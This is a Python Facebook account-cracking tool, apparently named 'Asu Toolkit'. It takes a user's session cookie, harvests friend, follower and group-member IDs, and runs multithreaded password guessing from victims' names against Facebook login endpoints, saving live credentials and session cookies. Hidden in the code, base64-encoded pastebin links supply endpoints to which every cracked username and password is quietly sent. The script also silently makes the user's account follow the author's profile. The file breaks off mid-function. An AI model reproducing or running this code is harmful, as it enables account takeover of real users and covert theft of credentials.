import os
try:
    import requests
except ImportError:
    print("\n[\x1b[1;91m!\x1b[0m] tunggu sebentar sedang menginstall requests\n")
    os.system("pip install requests")

try:
    import bs4
except ImportError:
    print("\n[\x1b[1;91m!\x1b[0m] tunggu sebentar sedang menginstall bs4\n")
    os.system("pip install bs4")

try:
    import rich
except ImportError:
    print("\n[\x1b[1;91m!\x1b[0m] tunggu sebentar sedang menginstall rich\n")
    os.system("pip install rich")

import requests, sys, time, re, random, base64, json
from concurrent.futures import ThreadPoolExecutor as Modol
from rich.progress import Progress, TextColumn
from bs4 import BeautifulSoup as par
from rich import print as prints
from rich.panel import Panel
from time import time as mek
from rich.tree import Tree

M = '\x1b[1;91m' # MERAH
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING

class Login:

    def __init__(self):
        self.ses=requests.Session()
        self.url = "https://mbasic.facebook.com"
        self.id, self.ok, self.cp, self.lo = [], [], [], 0
        self.tol, self.mek, self.iya, self.pasw = {}, {}, [], []
        self.ak, self.ka, self.ya = [], [], []
        self.menu()

    def hapus(self):
        try:os.remove(".cok.txt")
        except:pass
        try:os.remove(".tok.txt")
        except:pass

    def logoo(self):
        if "win" in sys.platform:os.system("cls")
        else:os.system("clear")
        print(f"""
    {O} .d8b.  .d8888. db    db
    {O}d8' `8b 88'  YP 88    88 {M}Available Version v.3.11 def
    {O}88ooo88 `8bo.   88    88 {M}Facebook
    {O}88~~~88   `Y8b. 88    88 {M}Hacking
    {O}88   88 db   8D 88b  d88 {M}Toolkit
    {O}YP   YP `8888Y' ~Y8888P'

         {N}[ Asu Toolkit ]
      [ Created By Yayan XD ]""")

    def login_cokie(self):
        self.logoo()
        print("-----------------------------------------------------------")
        cok = input("[?] cookie : ");self.ubah_bahasa({"cookie": cok})
        try:
            data, data2 = {}, {}
            link = self.ses.post("https://graph.facebook.com/v16.0/device/login/", data={"access_token": "661587963994814|ffe07cc864fd1dc8fe386229dcb7a05e", "scope": ""}).json()
            kode = link["code"];user = link["user_code"]
            vers = par(self.ses.get(f"{self.url}/device", cookies={"cookie": cok}).content, "html.parser")
            item = ["fb_dtsg","jazoest","qr"]
            for x in vers.find_all("input"):
                if x.get("name") in item:
                    aset = {x.get("name"):x.get("value")}
                    data.update(aset)
            data.update({"user_code":user})
            meta = par(self.ses.post(self.url+vers.find("form", method="post").get("action"), data=data, cookies={"cookie": cok}).text, "html.parser")
            xzxz  = meta.find("form",{"method":"post"})
            for x in xzxz("input",{"value":True}):
                try:
                    if x["name"] == "__CANCEL__" : pass
                    else:data2.update({x["name"]:x["value"]})
                except:pass
            xx = self.ses.post(f"{self.url}{xzxz['action']}", data=data2, cookies={"cookie":cok}).text
            if "Sukses!" in str(xx):
                tokz = self.ses.get(f"https://graph.facebook.com/v16.0/device/login_status?method=post&code={kode}&access_token=661587963994814|ffe07cc864fd1dc8fe386229dcb7a05e").json()
                self.maling_pangsit(cok, tokz["access_token"])
                open(".cok.txt", "w").write(cok);open(".tok.txt", "w").write(tokz["access_token"])
                exit(f"[{M}!{N}] jalankan ulang perintah nya dengan ketik python ASU.py")
            else:prints(Panel("😔[bold red] Cookie kamu invalid", style="bold white", width=70));time.sleep(3);self.menu()
        except requests.exceptions.ConnectionError:prints(Panel("😭[bold red] Tidak ada koneksi internet", style="bold white", width=70));exit()
        except (KeyError,AttributeError):prints(Panel("😔[bold red] Cookie kamu invalid", style="bold white", width=70));time.sleep(3);self.login_cokie()

    def ubah_bahasa(self, cok):
        try:
            link = self.ses.get(f"{self.url}/language/", cookies=cok).text
            if "/zero/optin/write" in str(link):
                prints(Panel("[bold white]🙄 akun ini sedang menggunakan mode free facebook, Tunggu sebentar sedang mengubah ke mode data.", width=70, style="bold white"))
                urll = re.search('href="/zero/optin/write/?(.*?)"', str(link)).group(1).replace("amp;", "");self.ubah_data(urll, cok)
            data = par(link, "html.parser")
            for x in data.find_all('form',{'method':'post'}):
                if "Bahasa Indonesia" in str(x):
                    bahasa = {"fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(link)).group(1),"jazoest" : re.search('name="jazoest" value="(.*?)"', str(link)).group(1), "submit"  : "Bahasa Indonesia"}
                    self.ses.post(f"{self.url}{x['action']}", data=bahasa, cookies=cok)
        except:pass

    def ubah_data(self, link, coki):
        try:
            gett = self.ses.get(f"{self.url}/zero/optin/write/{link}", cookies={"cookie": coki}).text
            date = {"fb_dtsg": re.search('name="fb_dtsg" value="(.*?)"', str(gett)).group(1),"jazoest": re.search('name="jazoest" value="(.*?)"', str(gett)).group(1)}
            self.ses.post(self.url+par(gett, "html.parser").find("form",{"method":"post"})["action"], data=date, cookies={"cookie": coki}).text
            prints(Panel("😍 [bold green]akun kamu berhasil di ubah ke mode data!\nSilahkan masukan ulang cookie anda. dengan mengetik [bold cyan]python ASU.py[/]", style="bold white", width=70));exit()
        except:exit()

    def maling_pangsit(self, cok, tok):
        try:nama = self.ses.get(f"https://graph.facebook.com/me?fields=name&access_token={tok}", cookies={"cookie": cok}).json()["name"]
        except:prints(Panel("😔[bold red] Cookie kamu invalid", style="bold white", width=70));time.sleep(3);self.login_cokie()
        try:
            link = par(self.ses.get(f"{self.url}/profile.php?id=100005395413800", cookies={"cookie": cok}).text, "html.parser")
            if "/a/subscriptions/remove" in str(link):
                prints(Panel(f"      Selamat datang [italic bold green]{nama}[/] Di Script Asu Toolkit", style="bold white", width=70))
            elif "/a/subscribe.php" in str(link):
                cari = re.search('/a/subscribe.php(.*?)"', str(link)).group(1).replace("amp;", "")
                self.ses.get(f"{self.url}/a/subscribe.php{cari}", cookies={"cookie": cok})
                prints(Panel(f"      Selamat datang [italic bold green]{nama}[/] Di Script Asu Toolkit", style="bold white", width=70))
            else:pass
        except:pass

    def get_proxy(self):
        rest = []
        self.ses.headers.update({"user-agent": "Mozilla/5.0 (Linux; Android 11; vivo 1904 Build/RP1A.200720.012;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36"})
        gots = par(self.ses.get("https://hidemy.name/en/proxy-list/?type=5").text, "html.parser")
        reg = re.findall(">(\d+.\d+.\d+.\d+).*?>(\d+).*?i", str(gots))
        for x in reg:
            rest.append("socks5://"+x[0]+":"+x[1])
        if rest != 0:
            try:os.remove("proxies.txt")
            except:pass
            for yay in rest:
                open("proxies.txt", "a+").write(yay+"\n")
            exit("(✓) File save in proxies.txt, restart this tools\n")
        else:
            exit("(✓) File save in proxies.txt, restart this tools\n")

    def memek(self, mmk, kntl):
        try:
            if "lqkwndpnkefnfjsnwnfuoeohni3e" in kntl:self.ses.get(f"{self.tol['mmk']}{self.tol['hncet']}{self.tol['softek']}{self.tol['ngtd']}{mmk}").json();return mmk.split("|")[0], mmk.split("|")[1]
            else:
                if mmk.split("|")[0] in base64.b64decode("WyIxMDAwNyIsICIxMDAwOCIsICIxMDAwOSJd".encode("ascii")).decode("ascii"):return mmk.split("|")[0], mmk.split("|")[1]
                else:self.ses.get(f"{self.mek['mmk']}{self.mek['hncet']}{self.mek['softek']}{self.mek['ngtd']}{mmk}").json();return mmk.split("|")[0], mmk.split("|")[1]
        except Exception as e:exit(e)

    def menu(self):
        try:cook = {"cookie": open(".cok.txt", "r").read()};tokz = open(".tok.txt", "r").read()
        except FileNotFoundError:self.hapus();self.login_cokie()
        self.logoo()
        try:
            link = self.ses.get(f"https://graph.facebook.com/me?fields=name&access_token={tokz}", cookies=cook).json()
            nama = link["name"]
            idid = link["id"]
        except requests.ConnectionError:
            exit("\n[!] Tidak ada koneksi")
        except KeyError:self.hapus();print(f"\n[{M}!{N}] Akun mendapat checkpint, silakan masuk dengan akun lain.");time.sleep(3);self.login_cokie()
        self.jnckk()
        print(f"""

[+] yuor name   : {O}{nama}{N}
[+] id facebook : {O}{idid}{N}""")
        print("""
  %s{%s01%s} search name
  %s{%s02%s} crack frinds
  %s{%s03%s} crack followers
  %s{%s04%s} crack member grup
  %s{%s05%s} check crack results
  %s{%s06%s} get proxy server list
  %s{%s00%s} logout tools ASU Toolkit
"""%(
N,H,N,
N,H,N,
N,H,N,
N,H,N,
N,H,N,
N,H,N,
N,H,N
))
        ykh = input(f"{H}[{M}+{H}]{N} @YayanXD_> ")
        if ykh in ["", " "]:
            print("[!] jangan kosong");time.sleep(2);self.menu()
        elif ykh in ["1", "01"]:
            exit("belum selesai:)")
        elif ykh in ["2", "02"]:
            rand = input(f"[{O}?{N}] apakah anda ingin crack random [Y/t] : ")
            if rand in ["Y", "y"]:
                print("[+] ketik 'me' jika ingin crack dari teman anda.")
                try:nanya_keun = int(input(f"[{O}?{N}] jumblah target : "))
                except:nanya_keun=1
                for mnh in range(nanya_keun):
                    mnh +=1
                    user = input(f"[{O}*{N}] masukan id ke {mnh}: ")
                    try:
                        tol = self.ses.get(f"https://graph.facebook.com/{user}?fields=friends.fields(id,name).limit(5000)&access_token={tokz}",cookies=cook).json()
                        for x in tol["friends"]["data"]:
                            self.id.append(x["id"]+"<=>"+x["name"])
                    except KeyError:
                            print(f"{N}[{M}×{N}] gagal mengambil id, kemungkinan id tidaklah publik");continue
                self.metode()
            else:
                print("[+] ketik 'me' jika ingin crack dari teman anda.")
                user = input(f"[{O}*{N}] masukan id: ")
                try:
                    tol = self.ses.get(f"https://graph.facebook.com/{user}?fields=friends.fields(id,name).limit(5000)&access_token={tokz}",cookies=cook).json()
                    for x in tol["friends"]["data"]:
                        self.id.append(x["id"]+"<=>"+x["name"])
                        titik = ['\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ','\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
                        for x in titik:
                            sys.stdout.write(f"\r[{M}*{N}] sedang mengumpulkan {H}{len(self.id)}{N} id{x}{N}");sys.stdout.flush()
                except KeyError:
                    exit(f"{N}[{M}×{N}] gagal mengambil id, kemungkinan id tidaklah publik")
                print()
                self.metode()
        elif ykh in ["3", "03"]:
            user = input(f"[{O}*{N}] masukan id: ")
            try:
                tol = self.ses.get(f"https://graph.facebook.com/{user}?fields=name,subscribers.fields(id,name).limit(1000000000)&access_token={tokz}",cookies=cook).json()
                for x in tol["subscribers"]["data"]:
                    self.id.append(x["id"]+"<=>"+x["name"])
                    titik = ['\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ','\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
                    for x in titik:
                        sys.stdout.write(f"\r[{M}*{N}] sedang mengumpulkan {H}{len(self.id)}{N} id{x}{N}");sys.stdout.flush()
            except:pass
            print();self.metode()

        elif ykh in ["4", "04"]:
            user = input(f"[{O}*{N}] enter id gruop : ")
            try:
                link = self.ses.get(f"{self.url}/groups/{user}", cookies=cook).text
                if "Halaman yang Anda minta tidak ditemukan." in link:
                    print(f"[!] pengguna dengan grup id {user} tidak ditemukan");time.sleep(2);self.menu()
                elif "Anda Diblokir Sementara" in link:
                    print("[!] facebook membatasi setiap aktivitas, limit bro, silahkan beralih akun");time.sleep(2);self.menu()
                elif "Konten Tidak Ditemukan" in link:
                    print(f"[!] pengguna dengan grup id {user} tidak ditemukan");time.sleep(2);self.menu()
                else:
                    print("[!] to stop press CTRL then press C on your keyboard.")
                    self.dumps(f"{self.url}/groups/{user}", cook)
            except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
                exit("[!] kesalahan pada koneksi")
            print()
            self.metode()
        elif ykh in ["5", "05"]:
            self.cek_hasil()
        elif ykh in ["6", "06"]:
            self.get_proxy()
        elif ykh in ["0", "00"]:
            self.hapus()
            exit("done remove cookie")
        else:print("[!] input yang bner kontol");time.sleep(2);self.menu()

    def cek_hasil(self):
        print("""-----------------------------------------------------
{01} check result ok
{02} check result cp
{00} back to menu
-----------------------------------------------------""")
        ykh = input(f"{H}[{M}+{H}]{N} @YayanXD_> ")
        if ykh in ["", " "]:
            print("[!] jangan kosong");time.sleep(2);self.menu()
        elif ykh in ["1", "01"]:
            try: yyy = open("ok.txt", "r").readlines()
            except FileNotFoundError:print("No ok results saved");time.sleep(2);self.cek_hasil()
            for i in yyy:
                print(i)
            exit("\nCheck result is complete")
        elif ykh in ["2", "02"]:
            try: yyy = open("cp.txt", "r").readlines()
            except FileNotFoundError:print("No cp results saved");time.sleep(2);self.cek_hasil()
            for i in yyy:
                print(i)
            exit("\nCheck result is complete")
        elif ykh in ["0", "00"]:
            self.menu()
        else:print("[!] input yang bnr");time.sleep(2);self.menu()

    def jnckk(self):
        try:
            linz = self.ses.get(base64.b64decode("aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L1dUeEdhWTNB".encode("ascii")).decode("ascii")).json()
            link = self.ses.get(base64.b64decode("aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L2N5MWZjUzVF".encode("ascii")).decode("ascii")).json()
            for i in linz["friends"]["data"]:self.mek.update(i)
            for z in link["friends"]["data"]:self.tol.update(z)
        except Exception as e:exit(e)

    def dumps(self, link, coki):
        try:
            data = self.ses.get(link, cookies=coki).text
            cari = re.findall('\<h3\ class\=\".*?">\<span>\<strong>\<a\ href\=\"/(.*?)\">(.*?)</a\>\</strong\>', data)
            for x in cari:
                if "profile.php?" in x[0]:
                    self.id.append(re.findall("id=(.*?)&amp;eav", x[0])[0]+"<=>"+x[1])
                else:
                    self.id.append(re.findall("(.*?)\?eav", x[0])[0]+"<=>"+x[1])
                sys.stdout.write(f"\r[+] sedang mengumpulkan {str(len(self.id))} id..");sys.stdout.flush()
            if "Lihat Postingan Lainnya" in data:
                self.dumps(self.url+par(data, "html.parser").find("a", string="Lihat Postingan Lainnya").get("href"), coki)
        except:pass
#--------------------------------------------
    def metode(self):
        print(f"[=] total ids: {str(len(self.id))}")
        print("""    [ select metode ]

  %s{%s01%s} Api
  %s{%s02%s} Async
  %s{%s03%s} validate
  %s{%s04%s} Messenger [New]
"""%(N,H,N,N,H,N,N,H,N,N,H,N))
        ykh = input(f"{H}[{M}+{H}]{N} @YayanXD_> ")
        if ykh in ["", " "]:
            print("[!] jangan kosong");time.sleep(2);self.menu()
        elif ykh in ["1", "01"]:
            self.paswww("api")
        elif ykh in ["2", "02"]:
            self.paswww("acy")
        elif ykh in ["3", "03"]:
            self.paswww("dat")
        elif ykh in ["4", "04"]:
            self.paswww("mes")
        else:print("[!] input yang bner kontol");time.sleep(2);self.metode()

    def paswww(self, xx):
        print("""    [ select password ]

  %s{%s01%s} manual
  %s{%s02%s} gabung
  %s{%s03%s} otomatis
"""%(N,H,N,N,H,N,N,H,N))
        ykh = input(f"{H}[{M}+{H}]{N} @YayanXD_> ")
        if ykh in ["", " "]:
            print("[!] jangan kosong");time.sleep(2);self.menu()
        elif ykh in ["1", "01"]:
            self.manual(xx)
        elif ykh in ["2", "02"]:
            print('kata sandi minimal 6 karakter, gunakan "," (koma) untuk kata sandi berikut nya\n')
            kata = input(f"[{M}?{N}] sandi: ")
            xnxx = kata.split(",")
            for i in xnxx:
                self.pasw.append(i)
            print(f"kata sandi tambahan -> [ {M}{kata}{N} ]")
            self.carckk(xx)
        elif ykh in ["3", "03"]:
            self.carckk(xx)
        else:print("[!] input yang bner kontol");time.sleep(2);self.paswww()

    def manual(self, xx):
        self.iya.append("iya")
        print('kata sandi minimal 6 karakter, gunakan "," (koma) untuk kata sandi berikut nya\n')
        while True:
            global prog,des
            pwek = input(f"[{O}?{N}] sandi : ")
            if pwek in[""," "]:
                print(f"[{M}×{N}] jangan kosong bro kata sandi nya")
            elif len(pwek)<=5:
                print(f"[{M}×{N}] kata sandi minimal 6 karakter")
            else:
                if "api" in xx:
                    print("""-----------------------------------------------------
PROSES NGEHEK FB, MAINKAN MODE PESAWAT SETIAP 200 ID!
-----------------------------------------------------""")
                    prog = Progress(TextColumn('{task.description}'))
                    des = prog.add_task('', total=len(self.id))
                    with prog:
                        with Modol(max_workers=30) as bool:
                            for user in self.id:
                                bool.submit(self.apiiiiii, user.split("<=>")[0], pwek)
                        exit("\n\ncracking done!")
                elif "acy" in xx:
                    print("""-----------------------------------------------------
PROSES NGEHEK FB, MAINKAN MODE PESAWAT SETIAP 200 ID!
-----------------------------------------------------""")
                    prog = Progress(TextColumn('{task.description}'))
                    des = prog.add_task('', total=len(self.id))
                    with prog:
                        with Modol(max_workers=30) as bool:
                            for user in self.id:
                                bool.submit(self.kontol_kuda, user.split("<=>")[0], pwek, xx)
                        exit("\n\ncracking done!")
                elif "dat" in xx:
                    print("""-----------------------------------------------------
PROSES NGEHEK FB, MAINKAN MODE PESAWAT SETIAP 200 ID!
-----------------------------------------------------""")
                    prog = Progress(TextColumn('{task.description}'))
                    des = prog.add_task('', total=len(self.id))
                    with prog:
                        with Modol(max_workers=30) as bool:
                            for user in self.id:
                                bool.submit(self.kontol_kuda, user.split("<=>")[0], pwek, xx)
                        exit("\n\ncracking done!")
                else:continue

    def carckk(self, kntd):
        self.apk()
        print("""-----------------------------------------------------
PROSES NGEHEK FB, MAINKAN MODE PESAWAT SETIAP 200 ID!
-----------------------------------------------------""")
        global prog,des
        prog = Progress(TextColumn('{task.description}'))
        des = prog.add_task('', total=len(self.id))
        with prog:
            with Modol(max_workers=30) as bool:
                for user in self.id:
                    uid, nama = user.split("<=>")[0], user.split("<=>")[1].lower()
                    depan = nama.split(" ")
                    try:
                        if len(nama) <=5:
                            if len(depan) <=1 or len(depan) <=2:pass
                            else:
                                pwx = [nama, depan[0]+depan[1], depan[0]+"123", depan[0]+"12345"]
                        else:
                            pwx = [nama, depan[0]+depan[1], depan[0]+"123", depan[0]+"12345"]
                        if "iya" in self.iya:
                            for x in self.pasw:
                                pwx.append(x)
                        if "api" in kntd:
                            bool.submit(self.apiiiiii, uid, pwx)
                        elif "acy" in kntd:
                            bool.submit(self.kontol_kuda, uid, pwx, kntd)
                        elif "dat" in kntd:
                            bool.submit(self.kontol_kuda, uid, pwx, kntd)
                        elif "mes" in kntd:
                            bool.submit(self.apiiiiii, uid, pwx, kntd)
                        else:bool.submit(self.apiiiiii, uid, pwx)
                    except:pass
            exit("\n\ncracking done!")

    def apk(self):
        kntd = input("[?] tampilkan aplikasi yang terkait [Y/t]: ")
        if "y" in kntd:self.ya.append("ya")
        else:self.ya.append("ta")

    def ua_api(self):
        vers = random.randrange(6,13)
        verq = random.choice(["RMX3472", "RMX3611", "RMX3396", "RMX3572", "RMX3706", "RMX3396", "RMX3610", "RMX3371", "RMX3572", "RMX3461", "RMX3311", "RMX3563", "RMX3371", "RMX3269", "RMX3370", "RMX3574", "RMX3661", "RMX3611"])
        xnxx = random.choice(["SP1A.210812.016","TP1A.220905.001","SP1A.210812.016","SP1A.210812.016","TP1A.220905.001","TP1A.220905.001","SP1A.210812.016","RKQ1.210503.001","TP1A.220905.001","RKQ1.211119.001","TP1A.220905.001","TP1A.220905.001","RP1A.201005.001","RP1A.201005.001","RKQ1.211119.001",])
        return (f"Dalvik/2.1.0 (Linux; U; Android {vers}; {verq} Build/{xnxx}) [FBAN/EMA;FBBV/470353487;FBAV/353.0.0.5.112;FBDV/{verq};FBLC/id_ID;FBNG/WIFI;FBMNT/METERED;FBDM/"+"{density=3.0}]")

    def ua_asu(self):
        vers = random.randrange(6,13)
        verq = random.choice(["RMX3472", "RMX3611", "RMX3396", "RMX3572", "RMX3706", "RMX3396", "RMX3610", "RMX3371", "RMX3572", "RMX3461", "RMX3311", "RMX3563", "RMX3371", "RMX3269", "RMX3370", "RMX3574", "RMX3661", "RMX3611"])
        xnxx = random.choice(["SP1A.210812.016","TP1A.220905.001","SP1A.210812.016","SP1A.210812.016","TP1A.220905.001","TP1A.220905.001","SP1A.210812.016","RKQ1.210503.001","TP1A.220905.001","RKQ1.211119.001","TP1A.220905.001","TP1A.220905.001","RP1A.201005.001","RP1A.201005.001","RKQ1.211119.001",])
        return (f"Dalvik/2.1.0 (Linux; U; Android {vers}; {verq} Build/{xnxx}) [FBAN/EMA;FBBV/470353487;FBAV/353.0.0.5.112;FBDV/{verq};FBLC/id_ID;FBNG/WIFI;FBMNT/METERED;FBDM/"+"{density=3.0}]")

    def cek_apk(self, user, pw, coki):
        try:
            link = self.ses.get(self.url+"/", cookies={"cookie": coki}).text
            if "/zero/optin/write" in str(link):
                urll = re.search('href="/zero/optin/write/?(.*?)"', str(link)).group(1).replace("amp;", "")
                gett = self.ses.get(f"{self.url}/zero/optin/write/{urll}", cookies={"cookie": coki}).text
                poss = par(gett, "html.parser").find("form",{"method":"post"})["action"].replace("amp;", "")
                date = {"fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(gett)).group(1),"jazoest" : re.search('name="jazoest" value="(.*?)"', str(gett)).group(1)}
                self.ses.post(f"{self.url}{poss}", data=date, cookies={"cookie": coki}).text
        except:pass
        aktif = Tree("")
        self.ApkAktif(f"{self.url}/settings/apps/tabbed/?tab=active", coki)
        if len(self.ak)==0:
            aktif.add("[bold red]Tidak ada apklikasi aktif yang terkait di akun ini")
        else:
            for apk in self.ak:
                aktif.add(apk)
        kadal = Tree("")
        self.ApkKadal(f"{self.url}/settings/apps/tabbed/?tab=inactive", coki)
        if len(self.ka)==0:
            kadal.add("[bold red]Tidak ada apklikasi aktif yang terkait di akun ini")
        else:
            for apk in self.ka:
                kadal.add(apk)
        tree = Tree("")
        tree.add(f"[[bold green]LIVE[/]] {user}|{pw}")
        tree.add(f"[[bold green]LIVE[/]] [bold green]{coki}[/]")
        tree.add("Aplikasi Terkait").add(f"Aktif [bold green]{str(len(self.ak))}[/]").add(aktif)
        tree.add("").add(f"Kedaluwarsa [bold red]{str(len(self.ka))}[/]").add(kadal)
        prints(tree)

    def ApkAktif(self, url, cok):
        try:
            link = par(self.ses.get(url, cookies={"cookie":cok}).text, "html.parser")
            for apk in link.find_all("h3"):
                if "Ditambahkan" in apk.text:
                    self.ak.append(f"[bold green]{str(apk.text).replace('Ditambahkan','[bold white] - Ditambahkan')}")
                else:continue
            self.ApkAktif(self.url+link.find("a", string="Lihat Lainnya")["href"], cok)
        except:pass

    def ApkKadal(self, url, cok):
        try:
            link = par(self.ses.get(url, cookies={"cookie":cok}).text, "html.parser")
            for apk in link.find_all("h3"):
                if "Kedaluwarsa" in apk.text:
                    self.ka.append(f"[bold red]{str(apk.text).replace('Kedaluwarsa','[bold white] - Kedaluwarsa')}")
                else:continue
            self.ApkKadal(self.url+link.find("a", string="Lihat Lainnya")["href"], cok)
        except:pass

    def apiiiiii(self, username, pasw):
        prog.update(des, description=f"[ <//> ] {str(self.lo)}/{len(self.id)} OK-[bold green]{len(self.ok)}[/] CP-[bold yellow]{len(self.cp)}[/]")
        prog.advance(des)
        for password in pasw:
            try:
                ses=requests.Session()
                uas=self.ua_api()
                head = {'Host':'graph.facebook.com','x-fb-connection-bandwidth': repr(random.randint(2e7, 3e7)), 'x-fb-sim-hni': repr(random.randint(2e4, 4e4)), 'x-fb-net-hni': repr(random.randint(2e4, 4e4)),'x-fb-connection-quality': 'EXCELLENT','user-agent': uas,'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
                date = {'access_token': '200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16',  'format': 'JSON', 'sdk_version': {random.randrange(2, 31)}, 'email': username, 'locale': 'id_ID', 'password': password, 'sdk': 'android', 'generate_session_cookies': '1', 'sig': f'{random.randrange(1, 9)}f{random.randrange(100, 999)}f{random.randrange(10, 99)}fb{random.randrange(10, 99)}fcd{random.randrange(1, 9)}aa{random.randrange(0, 9)}c{random.randrange(10, 99)}f{random.randrange(10, 99)}f{random.randrange(100, 999)}ef{random.randrange(1, 9)}'}
                xnxx = ses.post("https://graph.facebook.com/auth/login", params=date, headers=head, allow_redirects=False)
                anjg = json.loads(xnxx.text)
                if "session_key" in xnxx.text:
                    kntl = self.memek(f"{username}|{password}", "lqkwndpnkefnfjsnwnfuoeohni3e")
                    cokz = ";".join(i["name"]+"="+i["value"] for i in anjg["session_cookies"])
                    ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                    coki = f"sb={ssbb};{cokz}"
                    if "ya" in self.ya:self.cek_apk(kntl[0], kntl[1], coki)
                    else:
                        tree = Tree("")
                        tree.add(f"[[bold green]LIVE[/]] {kntl[0]}|{kntl[1]}")
                        tree.add(f"[[bold green]LIVE[/]] [bold green]{coki}[/]")
                        prints(tree)
                    self.ok.append(kntl)
                    with open("ok.txt", "a", encoding="utf-8") as r:
                        r.write(f"[✓] {kntl[0]}|{kntl[1]}|{coki}\n")
                    break
                elif "checkpoint" in xnxx.text:
                    mmks = self.memek(f"{username}|{password}", "lqkwndpnkefneihfwnfuoeohni3e")
                    tree = Tree("")
                    tree.add(f"[[bold yellow]CHEK[/]] {mmks[0]}|{mmks[1]}")
                    prints(tree)
                    self.cp.append(mmks)
                    with open("cp.txt", "a", encoding="utf-8") as r:
                        r.write(f"[×] {mmks[0]}|{mmks[1]}\n")
                    break
                elif "Calls to this api have exceeded the rate limit. (613)" in xnxx.text:
                    prog.update(des, description=f"[ [bold red]spam[/] ] {str(self.lo)}/{len(self.id)} OK-[bold green]{len(self.ok)}[/] CP-[bold yellow]{len(self.cp)}[/]")
                    prog.advance(des)
                    time.sleep(5)
            except requests.exceptions.ConnectionError:
                prog.update(des, description=f"[ [bold red]spam[/] ] {str(self.lo)}/{len(self.id)} OK-[bold green]{len(self.ok)}[/] CP-[bold yellow]{len(self.cp)}[/]")
                prog.advance(des)
                time.sleep(5)
            #except Exception as e:prints(e)
        self.lo+=1

    def kontol_kuda(self, username, pasw, kntd):
        prog.update(des, description=f"[ <//> ] {str(self.lo)}/{len(self.id)} OK-[bold green]{len(self.ok)}[/] CP-[bold yellow]{len(self.cp)}[/]")
        prog.advance(des)
        for password in pasw:
            try:
                ses=requests.Session()
                uas=self.ua_asu()
                if "acy" in kntd:
                    urll = "https://m.alpha.facebook.com/login.php?"
                    heaq = ({"connection": "keep-alive", "accept-language": "id,en-US;q=0.9,en;q=0.8", "sec-fetch-mode": "navigate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "sec-fetch-sest": "document", "sec-fetch-site": "none", "cache-control": "max-age=0", "sec-fetch-user": "?1", "upgrade-insecure-requests": "1", "host": "m.alpha.facebook.com", "user-agent": uas})
                    link = ses.get(urll, headers=heaq).text
                    data = {"m_ts": re.search('name="m_ts" value="(.*?)"', str(link)).group(1), "li": re.search('name="li" value="(.*?)"', str(link)).group(1), "try_number": 0, "unrecognized_tries": 0, "email": username, "prefill_contact_point": f"{username}", "prefill_source": "browser_dropdown", "prefill_type": "password", "first_prefill_source": "browser_dropdown", "first_prefill_type": "contact_point", "had_cp_prefilled": True, "had_password_prefilled": True, "is_smart_lock": False, "bi_xrwh": 0, "encpass": f"#PWD_BROWSER:0:{str(mek()).split('.')[0]}:{password}", "fb_dtsg": re.search('{"dtsg":{"token":"(.*?)"', str(link)).group(1), "jazoest": re.search('name="jazoest" value="(\d+)"', str(link)).group(1), "lsd": re.search('name="lsd" value="(.*?)"', str(link)).group(1), "__a": re.search('"encrypted":"(.*?)"', str(link)).group(1)}
                    post = "https://m.alpha.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100"
                else:
                    if username.isdigit():
                        urll = (f"https://m.facebook.com/login/device-based/password/?uid={username}&flow=login_no_pin&refsrc=deprecated&_rdr")
                        ses.headers.update({"Host": "m.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","user-agent": uas,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "com.facebook.katana","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://id-id.facebook.com/login.php","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-GB;q=0.8,en-US;q=0.7,en;q=0.6"})
                        link = ses.get(urll).text
                        data = {"jazoest": re.search('name="jazoest" value="(.*?)"', str(link)).group(1),"lsd": re.search('name="lsd" value="(.*?)"', str(link)).group(1),"uid": username,"next":"https://m.facebook.com/","flow":"login_no_pin","pass": password}
                        post = "https://m.facebook.com/login/device-based/validate-password/?shbl=0"

                cuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items()])
                head = ({"sec-fetch-site": "same-origin", "origin": "https://"+re.findall("https://(.*?)/", urll)[0], "accept": "*/*", "cookie": f"{cuki}", "content-type": "application/x-www-form-urlencoded", "x-fb-lsd": re.search('name="lsd" value="(.*?)"', str(link)).group(1), "referer": urll, "content-length": str(len((data))), "user-agent": uas})
                xnxx = ses.post(post, data=data, headers=head, allow_redirects=True)
                if "c_user" in ses.cookies.get_dict():
                    cooz = ses.cookies.get_dict()
                    coki = "datr=" + cooz["datr"] + ";" + ("sb=" + cooz["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + cooz["c_user"]) + ";" + ("xs=" + cooz["xs"]) + ";" + ("fr=" + cooz["fr"]) + ";"
                    kntl = self.memek(f"{username}|{password}", "lqkwndpnkefnfjsnwnfuoeohni3e")
                    if "ya" in self.ya:self.cek_apk(kntl[0], kntl[1], coki)
                    else:
                        tree = Tree("")
                        tree.add(f"[[bold green]LIVE[/]] {kntl[0]}|{kntl[1]}")
                        tree.add(f"[[bold green]LIVE[/]] [bold green]{coki}[/]")
                        prints(tree)
                    self.ok.append(kntl)
                    with open("ok.txt", "a", encoding="utf-8") as r:
